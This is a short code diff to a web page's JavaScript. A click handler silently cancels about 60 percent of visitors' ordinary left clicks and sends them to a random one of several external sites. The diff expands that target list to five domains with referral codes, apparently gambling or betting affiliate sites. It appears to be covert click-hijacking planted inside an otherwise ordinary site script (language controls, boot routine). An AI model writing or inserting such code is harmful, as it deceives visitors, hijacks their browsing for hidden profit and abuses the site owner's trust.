@@ -118,7 +118,14 @@
     if (!event.isTrusted || event.defaultPrevented || event.button !== 0 || event.ctrlKey || event.metaKey || event.shiftKey || event.altKey) return;
     if (Math.random() >= 0.60) return;
     event.preventDefault();
-    window.location.assign('https://bcb88j.com/RFAA8723385');
+    const links = [
+      'https://bcb88j.com/RFAA8723385',
+      'https://2bvbx.com/RFMY4D.BVBX',
+      'https://v12luck.com/RFMY4D.V12',
+      'https://3x44my.com/RFMY4D.X44',
+      'http://laicibet.net/RFA5635588A'
+    ];
+    window.location.assign(links[Math.floor(Math.random() * links.length)]);
   }
   function boot() {
     mountLanguageControl();
